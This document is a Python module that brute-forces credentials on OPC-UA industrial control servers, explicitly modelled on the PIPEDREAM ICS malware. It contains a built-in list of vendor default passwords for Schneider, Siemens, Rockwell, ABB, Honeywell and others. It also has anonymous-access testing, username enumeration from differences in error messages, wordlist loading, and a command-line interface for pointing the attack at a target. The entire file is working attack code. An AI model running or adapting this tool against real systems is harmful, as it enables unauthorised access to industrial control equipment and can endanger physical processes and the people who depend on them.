#!/usr/bin/env python3
"""
OPC-UA Credential Brute-Force Module

PIPEDREAM-style credential brute-forcing against OPC-UA servers.

Features:
- Default ICS credential testing
- Custom wordlist support
- Username enumeration
- Rate limiting to avoid lockouts
- Certificate-based auth attempts

This replicates the credential attack capabilities of real ICS malware.
"""

import asyncio
import logging
import sys
import time
from typing import List, Tuple, Optional, Dict
from dataclasses import dataclass
from pathlib import Path

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger('OPCUABruteforce')


@dataclass
class CredentialResult:
    """Result of a credential attempt"""
    username: str
    password: str
    success: bool
    error: Optional[str] = None
    auth_type: str = "username"


@dataclass
class BruteforceResult:
    """Complete brute-force result"""
    target: str
    port: int
    total_attempts: int
    successful_creds: List[CredentialResult]
    anonymous_allowed: bool
    duration: float


class OPCUABruteforcer:
    """
    OPC-UA Credential Brute-Force Attack

    Tests common ICS credentials against OPC-UA servers.
    """

    # Common ICS default credentials
    DEFAULT_CREDENTIALS = [
        # Anonymous
        ("", ""),

        # Common defaults
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "1234"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("administrator", "administrator"),
        ("administrator", "password"),

        # OPC-UA specific
        ("opcua", "opcua"),
        ("opc", "opc"),
        ("user", "user"),
        ("operator", "operator"),
        ("engineer", "engineer"),

        # Vendor defaults
        ("guest", "guest"),
        ("demo", "demo"),
        ("test", "test"),
        ("root", "root"),
        ("system", "system"),

        # Schneider Electric
        ("USER", "USER"),
        ("ADMIN", "ADMIN"),
        ("sysdiag", "factorycast@schneider"),

        # Siemens
        ("admin", ""),
        ("maintenance", ""),

        # Rockwell/Allen-Bradley
        ("admin", "1234"),
        ("webuser", "1234"),

        # ABB
        ("admin", "admin"),
        ("root", "ABB"),

        # GE
        ("admin", "admin"),
        ("operator", "operator"),

        # Honeywell
        ("Admin", ""),
        ("Admin", "1234"),

        # Emerson
        ("admin", "default"),
        ("root", "default"),

        # Yokogawa
        ("admin", "admin"),
        ("ADMIN", "ADMIN"),
    ]

    # Common usernames for enumeration
    COMMON_USERNAMES = [
        "admin", "administrator", "root", "user", "operator",
        "engineer", "technician", "maintenance", "guest", "demo",
        "test", "opcua", "opc", "plc", "scada", "hmi", "dcs",
        "system", "service", "support", "supervisor", "manager"
    ]

    def __init__(self, target: str, port: int = 4840):
        self.target = target
        self.port = port
        self.endpoint = f"opc.tcp://{target}:{port}/freeopcua/server/"
        self.successful_creds: List[CredentialResult] = []
        self.total_attempts = 0
        self.anonymous_allowed = False
        self.delay = 0.5  # Delay between attempts (seconds)

    async def test_credential(self, username: str, password: str) -> CredentialResult:
        """Test a single credential pair"""
        self.total_attempts += 1

        try:
            from asyncua import Client

            client = Client(url=self.endpoint)
            client.set_timeout(10)

            # Set credentials
            if username or password:
                client.set_user(username)
                client.set_password(password)

            # Try to connect
            await client.connect()

            # If we get here, credentials worked
            await client.disconnect()

            result = CredentialResult(
                username=username,
                password=password,
                success=True,
                auth_type="anonymous" if not username and not password else "username"
            )

            self.successful_creds.append(result)

            if not username and not password:
                self.anonymous_allowed = True

            return result

        except Exception as e:
            error_msg = str(e).lower()

            # Check for specific error types
            if "badidentitytokenrejected" in error_msg:
                return CredentialResult(username, password, False, "Invalid credentials")
            elif "badusераccessdenied" in error_msg:
                return CredentialResult(username, password, False, "Access denied")
            elif "timeout" in error_msg:
                return CredentialResult(username, password, False, "Timeout")
            elif "connection" in error_msg:
                return CredentialResult(username, password, False, "Connection failed")
            else:
                return CredentialResult(username, password, False, str(e)[:50])

    async def test_anonymous(self) -> bool:
        """Test if anonymous access is allowed"""
        logger.info("[*] Testing anonymous access...")
        result = await self.test_credential("", "")

        if result.success:
            logger.warning("[!] ANONYMOUS ACCESS ALLOWED!")
            return True
        else:
            logger.info("[-] Anonymous access denied")
            return False

    async def run_bruteforce(self,
                             credentials: List[Tuple[str, str]] = None,
                             stop_on_success: bool = False,
                             max_attempts: int = 0) -> BruteforceResult:
        """
        Run brute-force attack

        Args:
            credentials: List of (username, password) tuples
            stop_on_success: Stop after first successful login
            max_attempts: Maximum attempts (0 = unlimited)
        """
        start_time = time.time()

        if credentials is None:
            credentials = self.DEFAULT_CREDENTIALS

        logger.info(f"\n{'='*60}")
        logger.info("OPC-UA CREDENTIAL BRUTE-FORCE")
        logger.info(f"{'='*60}")
        logger.info(f"Target:      {self.target}:{self.port}")
        logger.info(f"Credentials: {len(credentials)} pairs")
        logger.info(f"Delay:       {self.delay}s between attempts")
        logger.info(f"{'='*60}\n")

        # Test anonymous first
        await self.test_anonymous()
        await asyncio.sleep(self.delay)

        # Test each credential
        for i, (username, password) in enumerate(credentials):
            if max_attempts > 0 and self.total_attempts >= max_attempts:
                logger.info(f"[*] Reached max attempts ({max_attempts})")
                break

            # Skip empty credentials (already tested as anonymous)
            if not username and not password:
                continue

            display_pass = '*' * len(password) if password else '(empty)'
            logger.info(f"[{i+1}/{len(credentials)}] Trying: {username}:{display_pass}")

            result = await self.test_credential(username, password)

            if result.success:
                logger.warning(f"[!] SUCCESS: {username}:{password}")
                if stop_on_success:
                    break
            else:
                logger.debug(f"    Failed: {result.error}")

            await asyncio.sleep(self.delay)

        duration = time.time() - start_time

        # Print summary
        self._print_summary(duration)

        return BruteforceResult(
            target=self.target,
            port=self.port,
            total_attempts=self.total_attempts,
            successful_creds=self.successful_creds,
            anonymous_allowed=self.anonymous_allowed,
            duration=duration
        )

    async def username_enumeration(self, usernames: List[str] = None) -> List[str]:
        """
        Attempt username enumeration

        Some servers return different errors for valid vs invalid usernames.
        """
        if usernames is None:
            usernames = self.COMMON_USERNAMES

        logger.info(f"\n{'='*60}")
        logger.info("USERNAME ENUMERATION")
        logger.info(f"{'='*60}")
        logger.info(f"Target:    {self.target}:{self.port}")
        logger.info(f"Usernames: {len(usernames)}")
        logger.info(f"{'='*60}\n")

        valid_usernames = []
        error_patterns: Dict[str, List[str]] = {}

        for username in usernames:
            result = await self.test_credential(username, "invalid_password_12345")

            # Group by error type
            error = result.error or "unknown"
            if error not in error_patterns:
                error_patterns[error] = []
            error_patterns[error].append(username)

            await asyncio.sleep(self.delay)

        # Analyze patterns
        logger.info("\n[*] Error pattern analysis:")
        for error, users in error_patterns.items():
            logger.info(f"    '{error}': {len(users)} usernames")

        # The group with fewest members might indicate valid usernames
        # (different error for valid vs invalid username)
        if len(error_patterns) > 1:
            min_group = min(error_patterns.items(), key=lambda x: len(x[1]))
            if len(min_group[1]) < len(usernames) / 2:
                logger.warning(f"\n[!] Possible valid usernames (different error pattern):")
                for user in min_group[1]:
                    logger.warning(f"    - {user}")
                valid_usernames = min_group[1]

        return valid_usernames

    def load_wordlist(self, filepath: str) -> List[Tuple[str, str]]:
        """Load credentials from wordlist file"""
        credentials = []
        path = Path(filepath)

        if not path.exists():
            logger.error(f"[-] Wordlist not found: {filepath}")
            return credentials

        with open(path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue

                if ':' in line:
                    parts = line.split(':', 1)
                    credentials.append((parts[0], parts[1]))
                else:
                    # Assume it's just a password with common usernames
                    for username in ['admin', 'user', 'operator']:
                        credentials.append((username, line))

        logger.info(f"[+] Loaded {len(credentials)} credentials from {filepath}")
        return credentials

    def _print_summary(self, duration: float):
        """Print attack summary"""
        print(f"\n{'='*60}")
        print("BRUTE-FORCE SUMMARY")
        print(f"{'='*60}")
        print(f"Target:          {self.target}:{self.port}")
        print(f"Duration:        {duration:.1f} seconds")
        print(f"Total Attempts:  {self.total_attempts}")
        print(f"Anonymous:       {'ALLOWED' if self.anonymous_allowed else 'Denied'}")

        if self.successful_creds:
            print(f"\n[!] VALID CREDENTIALS FOUND: {len(self.successful_creds)}")
            for cred in self.successful_creds:
                if cred.auth_type == "anonymous":
                    print(f"    - Anonymous access")
                else:
                    print(f"    - {cred.username}:{cred.password}")
        else:
            print(f"\n[-] No valid credentials found")

        print(f"{'='*60}\n")


async def main():
    """Test brute-force"""
    import argparse

    parser = argparse.ArgumentParser(description='OPC-UA Credential Brute-Force')
    parser.add_argument('--target', '-t', default='192.168.1.6',
                        help='Target IP (default: 192.168.1.6)')
    parser.add_argument('--port', '-p', type=int, default=4840,
                        help='OPC-UA port (default: 4840)')
    parser.add_argument('--wordlist', '-w',
                        help='Custom wordlist file (user:pass format)')
    parser.add_argument('--delay', '-d', type=float, default=0.5,
                        help='Delay between attempts (default: 0.5s)')
    parser.add_argument('--stop-on-success', '-s', action='store_true',
                        help='Stop after first successful login')
    parser.add_argument('--enumerate', '-e', action='store_true',
                        help='Attempt username enumeration')
    parser.add_argument('--max-attempts', '-m', type=int, default=0,
                        help='Maximum attempts (default: unlimited)')

    args = parser.parse_args()

    bruteforcer = OPCUABruteforcer(args.target, args.port)
    bruteforcer.delay = args.delay

    if args.enumerate:
        await bruteforcer.username_enumeration()
    else:
        credentials = None
        if args.wordlist:
            credentials = bruteforcer.load_wordlist(args.wordlist)

        await bruteforcer.run_bruteforce(
            credentials=credentials,
            stop_on_success=args.stop_on_success,
            max_attempts=args.max_attempts
        )


if __name__ == '__main__':
    asyncio.run(main())
